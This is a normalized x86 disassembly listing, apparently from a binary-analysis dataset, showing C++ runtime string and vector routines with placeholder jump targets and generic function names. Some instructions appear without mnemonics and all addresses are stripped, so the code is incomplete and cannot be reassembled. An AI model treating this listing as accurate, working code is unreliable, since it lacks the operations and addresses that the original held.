jae r-xdata
call sub_406b1b
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
call sub_406b1b
cmp esi ebx
jne r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
cmp [ esp + 0x20 ] esi
jae r-xdata
cmp ecx ebx
je r-xdata
cmp al 0xff
je r-xdata
mov eax [ esp + 0x1c ]
push esi
movsx edx [ esp + 0x17 ]
add ecx eax
mov dh dl
mov [ ecx ] dl
push esi
lea ecx [ esp + 0x18 ]
call sub_402fb0
mov ecx [ esp + 0x18 ]
mov edx [ ebp ]
inc edx
mov [ ebp ] edx
mov al [ edi ]
cmp al 0x3d
je r-xdata
push ebx
jmp r-xdata
cmp esi ebx
jne r-xdata
movsx ecx al
mov eax [ esp + 0x28 ]
movsx edx [ esp + ecx + 0x2c ]
add eax edx
mov edx [ esp + 0x1c ]
mov [ esp + 0x28 ] eax
mov eax [ r--data ]
sub eax edx
inc edi
cmp eax 0x1
ja r-xdata
lea ecx [ esp + 0x18 ]
call sub_402e60
dec al
push ebx
mov [ ecx - 0x1 ] al
lea ecx [ esp + 0x18 ]
call sub_402ca0
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea esi [ ecx + 0x1 ]
lea ecx [ esp + 0x14 ]
call sub_402fa0
cmp eax esi
jae r-xdata
call sub_406b1b
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
call sub_406b1b
cmp esi ebx
jne r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
cmp [ esp + 0x20 ] esi
jae r-xdata
cmp ecx ebx
je r-xdata
cmp al 0xff
je r-xdata
mov eax [ esp + 0x1c ]
push esi
movsx edx [ esp + 0x2c ]
add ecx eax
mov dh dl
mov [ ecx ] dl
push esi
lea ecx [ esp + 0x18 ]
call sub_402fb0
mov ecx [ esp + 0x18 ]
inc [ ebp ]
push ebx
jmp r-xdata
cmp esi ebx
jne r-xdata
lea ecx [ esp + 0x18 ]
call sub_402e60
dec al
push ebx
mov [ ecx - 0x1 ] al
lea ecx [ esp + 0x18 ]
call sub_402ca0
mov eax [ ebp ]
inc eax
mov [ ebp ] eax
mov eax [ esp + 0x24 ]
add eax 0x4
jmp r-xdata
sub_4056c0
push 0xffffffff
push sub_40e277
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
xor ebx ebx
push esi
push edi
mov [ esp + 0xc ] ebx
mov al [ esp + 0x50 ]
push ebx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x4c ] 0x3
mov [ esp + 0x14 ] al
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x18 ]
call sub_402c00
mov cl [ esp + 0x54 ]
push ebx
mov [ esp + 0x24 ] cl
lea ecx [ esp + 0x24 ]
mov [ esp + 0x4c ] 0x4
call sub_402ca0
mov edx [ r--data ]
lea eax [ esp + 0x54 ]
push edx
push ebx
push eax
lea ecx [ esp + 0x2c ]
call sub_402a00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor esi esi
[ edi ]
not ecx
dec ecx
mov [ esp + 0x48 ] 0x5
push ecx
mov ecx [ esp + 0x70 ]
push rw-data
push ecx
push ebx
lea ecx [ esp + 0x74 ]
call sub_406910
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x6c ]
mov edi rw-data
add esi ecx
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x7c ]
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
push ebx
lea ecx [ esp + 0x84 ]
call sub_406910
cmp eax ebx
jne r-xdata
mov edx [ esp + 0x68 ]
cmp edx ebx
jne r-xdata
mov edx [ esp + 0x78 ]
cmp edx ebx
jne r-xdata
mov eax [ esp + 0x28 ]
jmp r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push edx
lea ecx [ esp + 0x2c ]
call sub_405d70
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edx r--data
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
push edx
lea ecx [ esp + 0x2c ]
call sub_405d70
mov edx r--data
cmp eax 0xffffffff
je r-xdata
mov esi [ esp + 0x50 ]
mov dl [ esp + 0x10 ]
push ebx
mov ecx esi
mov [ esi ] dl
call sub_402ca0
mov eax [ r--data ]
lea ecx [ esp + 0x10 ]
push eax
push ebx
push ecx
mov ecx esi
call sub_402a00
mov [ esp + 0xc ] 0x1
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0x4c ] 0x4
call sub_402ca0
mov ecx [ esp + 0x14 ]
cmp ecx ebx
je r-xdata
sub eax esi
lea ecx [ esp + 0x20 ]
push eax
lea eax [ esp + 0x34 ]
push esi
push eax
call sub_405b80
mov ecx [ r--data ]
mov [ esp + 0x48 ] 0x6
push ecx
push ebx
push eax
lea ecx [ esp + 0x1c ]
call sub_402a00
push 0x1
lea ecx [ esp + 0x34 ]
mov [ esp + 0x4c ] 0x5
call sub_402ca0
mov ecx [ esp + 0x58 ]
mov [ esp + 0x14 ] ebx
cmp ecx ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
mov ecx [ esp + 0x68 ]
mov [ esp + 0x58 ] ebx
cmp ecx ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x78 ]
mov [ esp + 0x68 ] ebx
cmp ecx ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x70 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x40
retn 0x34
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_405950
push 0xffffffff
push sub_40e298
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
mov [ esp + 0x14 ] ebx
call sub_407a8f
push eax
call sub_407a67
call sub_407a71
cdq
mov ecx 0x2710
idiv ecx
push edx
lea edx [ esp + 0x30 ]
push rw-data
push edx
call sub_407a15
mov al [ esp + 0x88 ]
lea edi [ esp + 0x38 ]
mov [ esp + 0x28 ] al
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
dec ecx
push 0x1
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_402e80
test al al
je r-xdata
mov esi [ esp + 0x74 ]
mov cl [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
mov [ esp + 0x6c ] ebx
mov [ esi ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov edx [ r--data ]
mov ecx esi
push edx
push ebx
push eax
call sub_402a00
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
mov edi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
lea esi [ esp + 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] bl
mov ecx [ esp + 0x64 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x60
retn 0x4
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_405a60
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov ebx ecx
mov al [ esi ]
xor edi edi
mov [ ebx ] al
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov ecx [ esi + 0x8 ]
mov eax [ r--data ]
mov ebp ecx
cmp eax ebp
jae r-xdata
cmp ebx esi
jne r-xdata
mov ebp eax
cmp ebp edi
jbe r-xdata
cmp ebp edi
mov esi eax
jbe r-xdata
push 0x1
push ebp
mov ecx ebx
call sub_402e80
test al al
je r-xdata
cmp ebp ecx
jne r-xdata
mov ecx ebx
call sub_4030c0
mov eax [ ebx + 0x8 ]
sub eax ebp
cmp eax esi
jae r-xdata
call sub_406d47
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
mov esi [ esi + 0x4 ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
cmp esi edi
jbe r-xdata
mov esi eax
mov edi [ ebx + 0x4 ]
mov ecx ebp
mov eax ecx
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_402e60
mov esi r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebx
call sub_4030c0
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
mov ecx [ ebx + 0x4 ]
sub eax esi
add ecx ebp
push eax
lea edx [ ecx + esi ]
push edx
push ecx
call sub_407270
mov ebp [ ebx + 0x8 ]
add esp 0xc
sub ebp esi
mov ecx ebx
push edi
push ebp
call sub_402e80
test al al
je r-xdata
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
push ebp
mov ecx ebx
call sub_402e60
mov [ ebx + 0x4 ] eax
mov ecx [ esi + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ ebx + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
mov eax r--data
sub_405b80
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi ecx
xor eax eax
mov cl [ esp + 0x14 ]
push edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
mov [ ebp ] cl
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] eax
cmp [ esi + 0x8 ] edi
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x20 ]
mov ebx eax
sub ebx edi
cmp ecx ebx
jae r-xdata
call sub_406d47
cmp ebp esi
jne r-xdata
mov ebx ecx
test ebx ebx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ r--data ]
add ebx edi
cmp eax ebx
jae r-xdata
push 0x1
push ebx
mov ecx ebp
call sub_402e80
test al al
je r-xdata
cmp ebx eax
jne r-xdata
mov ecx ebp
call sub_4030c0
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax esi
jae r-xdata
call sub_406d47
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
test esi esi
jbe r-xdata
mov esi eax
mov ecx ebx
lea esi [ eax + edi ]
mov edi [ ebp + 0x4 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ecx + ebx ] 0x0
mov eax r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
mov ebx edi
call sub_4030c0
mov eax [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov edx [ ebp + 0x4 ]
sub eax esi
push eax
lea ecx [ edx + ebx ]
lea eax [ ecx + esi ]
push eax
push ecx
call sub_407270
mov ebx [ ebp + 0x8 ]
add esp 0xc
sub ebx esi
mov ecx ebp
push 0x0
push ebx
call sub_402e80
test al al
je r-xdata
push 0x1
mov ecx ebp
call sub_402ca0
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
test ebx ebx
jbe r-xdata
mov ebx eax
push ebx
mov ecx ebp
call sub_402e60
mov [ ebp + 0x4 ] eax
mov ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov eax r--data
mov ecx [ ebp + 0x4 ]
sub eax ebx
push eax
lea edx [ ecx + ebx ]
push edx
push ecx
call sub_407270
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi ebx
mov ecx ebp
push 0x0
push esi
call sub_402e80
test al al
je r-xdata
push esi
mov ecx ebp
call sub_402e60
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
sub_405d10
push ebx
push ebp
push esi
push edi
mov edi ecx
xor ebx ebx
mov ebp [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
cmp esi ebp
je r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_406b10
add esp 0x4
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
add esi 0x10
cmp esi ebp
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_405d70
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
test esi esi
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ebp [ ecx + 0x8 ]
cmp eax ebp
jae r-xdata
cmp eax [ ecx + 0x8 ]
jbe r-xdata
mov eax [ r--data ]
sub ebp eax
cmp esi ebp
ja r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0xc
mov ebx [ ecx + 0x4 ]
mov edx 0x1
sub edx esi
add ebp edx
add ebx eax
mov ecx esi
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov edx [ ecx + 0x4 ]
pop ebx
sub eax edx
pop ecx
retn 0xc
mov esi [ esp + 0x20 ]
sub ebx eax
lea ebp [ ebx + ebp - 0x1 ]
lea ebx [ eax + 0x1 ]
jmp r-xdata
mov edi [ esp + 0x18 ]
push ebp
movsx eax [ edi ]
push eax
push ebx
call sub_407b70
add esp 0xc
test eax eax
je r-xdata
sub_405e00
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp esi eax
ja r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ esp + 0x18 ]
cmp eax ecx
jb r-xdata
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
sub eax esi
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
retn 0xc
mov edx [ ecx + 0x4 ]
mov ebp [ esp + 0x14 ]
add eax edx
mov eax edx
cmp eax edx
je r-xdata
mov ecx esi
mov edi ebp
mov esi eax
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
dec eax
jmp r-xdata
pop edi
pop esi
pop ebp
sub eax edx
pop ebx
retn 0xc
mov esi [ esp + 0x1c ]
mov cl [ ebp ]
mov bl [ eax ]
cmp bl cl
jne r-xdata
sub_405e80
push esi
mov esi ecx
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
mov al [ eax - 0x1 ]
test al al
je r-xdata
pop edi
pop esi
retn
mov [ esi - 0x1 ] 0xff
cmp al 0xff
je r-xdata
mov edi [ esi + 0x8 ]
cmp edi 0xfffffffd
jbe r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
call sub_406b1b
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
test ecx ecx
je r-xdata
cmp al 0xff
je r-xdata
push edi
mov ecx esi
call sub_402fb0
push edi
mov ecx esi
call sub_402e60
jmp r-xdata
test edi edi
jne r-xdata
dec al
mov [ ecx - 0x1 ] al
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
jmp r-xdata
sub_405f00
sub esp 0xc
mov eax [ esp + 0x14 ]
push ebx
mov ebx [ esp + 0x14 ]
mov edx ecx
push ebp
push esi
mov ecx [ edx + 0x8 ]
push edi
mov edi ebx
cmp eax ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x10 ] edi
je r-xdata
mov ebp [ edx + 0x8 ]
cmp edi ebp
je r-xdata
mov esi ebx
lea ebp [ eax + 0x4 ]
sub esi eax
mov [ esp + 0x24 ] esi
mov [ edx + 0x8 ] edi
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0xc
retn 0x8
lea esi [ edi + 0x4 ]
lea edx [ ebp - 0x4 ]
cmp edi edx
jne r-xdata
mov ebx eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
add esi 0x10
lea ecx [ esi - 0x4 ]
cmp ecx ebp
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
test ebx ebx
jbe r-xdata
push eax
push ebx
mov ecx edi
call sub_402d40
push 0x0
push 0x0
mov ecx edi
call sub_402d40
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push ecx
call sub_406b10
mov edx [ esp + 0x18 ]
mov ebx [ esp + 0x24 ]
add esp 0x4
cmp al 0xff
je r-xdata
push 0x1
push ebx
mov ecx edi
call sub_402e80
test al al
je r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ esp + 0x18 ]
add ebp 0x10
add edi 0x10
lea eax [ ebp - 0x4 ]
mov [ esp + 0x10 ] edi
cmp eax ecx
jne r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
mov esi [ ebp ]
test esi esi
jne r-xdata
mov eax [ ebp ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x4 ]
mov eax [ r--data ]
mov ebx ecx
cmp eax ebx
jae r-xdata
mov edx [ esp + 0x14 ]
mov ebx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
mov ecx ebx
mov edx ecx
push ebx
mov edi [ eax + ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
call sub_402e60
mov edi [ esp + 0x10 ]
mov esi [ esp + 0x24 ]
mov esi r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
push 0x1
mov ecx edi
call sub_402ca0
mov eax [ ebp ]
test eax eax
jne r-xdata
mov [ esi + ebp ] eax
mov ecx [ ebp + 0x4 ]
mov [ esi + ebp + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov [ esi + ebp + 0x8 ] edx
mov cl [ eax - 0x1 ]
inc cl
mov [ eax - 0x1 ] cl
jmp r-xdata
mov eax r--data
sub_406070
sub esp 0xc
mov eax [ ecx + 0xc ]
push ebx
push ebp
push esi
mov esi [ ecx + 0x8 ]
push edi
mov edi [ esp + 0x24 ]
sub eax esi
sar eax 0x4
cmp eax edi
mov [ esp + 0x10 ] ecx
jae r-xdata
mov ebx [ esp + 0x20 ]
mov edx esi
sub edx ebx
sar edx 0x4
cmp edx edi
jae r-xdata
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
test edi edi
jbe r-xdata
mov eax edi
mov ebp ebx
shl eax 0x4
cmp ebx esi
mov [ esp + 0x20 ] eax
lea edx [ eax + ebx ]
je r-xdata
mov eax edi
mov eax esi
sub eax ecx
sar eax 0x4
cmp edi eax
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0xc
shl edi 0x4
mov eax edi
mov edi esi
sub edi eax
mov ebp esi
cmp edi esi
mov [ esp + 0x20 ] eax
je r-xdata
mov esi [ ecx + 0x8 ]
mov ebp [ esp + 0x28 ]
mov edx esi
sub edx ebx
sar edx 0x4
sub edi edx
je r-xdata
mov [ esp + 0x24 ] edx
sub esi ecx
sar esi 0x4
xor esi esi
jmp r-xdata
test ecx ecx
jne r-xdata
mov edi [ ecx + 0x8 ]
mov esi edi
sub esi eax
cmp ebx esi
je r-xdata
push edi
push ebp
call sub_4066e0
add edi 0x10
add esp 0x8
add ebp 0x10
cmp edi esi
jne r-xdata
mov edi [ ecx + 0x8 ]
mov esi ebx
cmp ebx edi
je r-xdata
push ebp
push esi
call sub_4066e0
add esp 0x8
add esi 0x10
dec edi
jne r-xdata
mov eax [ esp + 0x24 ]
push ebp
push eax
call sub_4066e0
mov ecx [ esp + 0x2c ]
add ebp 0x10
add esp 0x8
add ecx 0x10
cmp ebp esi
mov [ esp + 0x24 ] ecx
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
shl eax 0x4
push eax
call sub_4075a5
mov ebp [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov ebx eax
mov eax [ esp + 0x24 ]
mov esi [ ebp + 0x4 ]
add esp 0x4
cmp esi eax
je r-xdata
xor eax eax
add eax esi
test eax eax
mov [ esp + 0x14 ] eax
jge r-xdata
lea edi [ eax + ebx ]
mov esi ebx
cmp ebx edi
je r-xdata
mov ecx [ r--data ]
sub esi 0x10
sub edi 0x10
push ecx
push 0x0
push esi
mov ecx edi
call sub_402a00
cmp esi ebx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
add [ ecx + 0x8 ] eax
mov eax [ r--data ]
mov ecx esi
push eax
push 0x0
push ebp
call sub_402a00
add esi 0x10
cmp esi edi
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
test edi edi
mov esi ebx
jbe r-xdata
push esi
push ebx
call sub_4066e0
mov eax [ esp + 0x28 ]
add esi 0x10
add esp 0x8
add ebx 0x10
cmp esi eax
jne r-xdata
mov ebx [ esp + 0x28 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
pop edi
pop esi
mov edx [ ecx + 0x8 ]
pop ebp
add edx eax
pop ebx
mov [ ecx + 0x8 ] edx
add esp 0xc
retn 0xc
mov esi [ esp + 0x20 ]
mov edx edi
shl edx 0x4
lea eax [ edx + ebx ]
mov ebx [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov [ esp + 0x24 ] edi
mov edx [ r--data ]
mov ecx esi
push edx
push 0x0
push ebx
call sub_402a00
add esi 0x10
cmp esi edi
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x4 ]
cmp esi ebx
je r-xdata
mov [ esp + 0x20 ] eax
mov ecx [ esp + 0x28 ]
push ecx
push esi
call sub_4066e0
mov eax [ esp + 0x2c ]
add esp 0x8
add esi 0x10
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
mov ecx [ ebp + 0x4 ]
push ecx
call sub_406b10
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov ecx [ ebp + 0x4 ]
add esp 0x4
shl eax 0x4
add eax edx
test ecx ecx
mov [ ebp + 0xc ] eax
jne r-xdata
push 0x1
mov ecx esi
call sub_402ca0
add esi 0x10
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x20 ]
push esi
push eax
call sub_4066e0
mov ecx [ esp + 0x28 ]
add esi 0x10
add esp 0x8
add ecx 0x10
cmp esi ebx
mov [ esp + 0x20 ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x4 ] edx
sub eax ecx
sar eax 0x4
add eax edi
pop edi
shl eax 0x4
add eax edx
pop esi
mov [ ebp + 0x8 ] eax
pop ebp
pop ebx
add esp 0xc
retn 0xc
xor eax eax
mov [ ebp + 0x4 ] edx
mov eax edi
pop edi
shl eax 0x4
add eax edx
pop esi
mov [ ebp + 0x8 ] eax
pop ebp
pop ebx
add esp 0xc
retn 0xc
sub_406330
push 0xffffffff
push sub_40e2b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
mov eax [ esp + 0x28 ]
mov edx [ r--data ]
push ebx
push esi
mov cl [ eax ]
push edi
xor ebx ebx
push edx
mov [ esp + 0x14 ] cl
push ebx
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_402a00
mov esi [ esp + 0x38 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
mov edx [ esp + 0x18 ]
or eax 0xffffffff
not ecx
dec ecx
sub eax edx
mov edi ecx
mov [ esp + 0x28 ] ebx
cmp eax edi
ja r-xdata
cmp edi ebx
push ebp
jbe r-xdata
call sub_406b1b
mov esi [ esp + 0x34 ]
mov cl [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
mov [ esi ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov edx [ r--data ]
mov ecx esi
push edx
push ebx
push eax
call sub_402a00
mov eax [ esp + 0x18 ]
pop ebp
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x1c ]
push ebx
lea ebp [ ecx + edi ]
lea ecx [ esp + 0x18 ]
push ebp
call sub_402e80
test al al
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx edi
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] bl
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
pop edi
mov [ ecx ] al
mov eax esi
pop esi
pop ebx
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
sub_406460
push 0xffffffff
push sub_40e2d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
mov eax [ esp + 0x28 ]
mov edx [ r--data ]
push ebx
push esi
mov cl [ eax ]
push edi
xor ebx ebx
push edx
mov [ esp + 0x14 ] cl
push ebx
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call sub_402a00
mov esi [ esp + 0x38 ]
or edi 0xffffffff
mov [ esp + 0x28 ] ebx
mov eax [ esi + 0x8 ]
cmp eax 0xffffffff
jae r-xdata
mov edx [ esp + 0x18 ]
or eax 0xffffffff
sub eax edx
cmp eax edi
ja r-xdata
mov edi eax
cmp edi ebx
push ebp
jbe r-xdata
call sub_406b1b
mov esi [ esp + 0x34 ]
mov cl [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
mov [ esi ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov edx [ r--data ]
mov ecx esi
push edx
push ebx
push eax
call sub_402a00
mov eax [ esp + 0x18 ]
pop ebp
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x1c ]
push ebx
lea ebp [ ecx + edi ]
lea ecx [ esp + 0x18 ]
push ebp
call sub_402e80
test al al
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov esi [ esi + 0x4 ]
cmp esi ebx
jne r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx edi
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
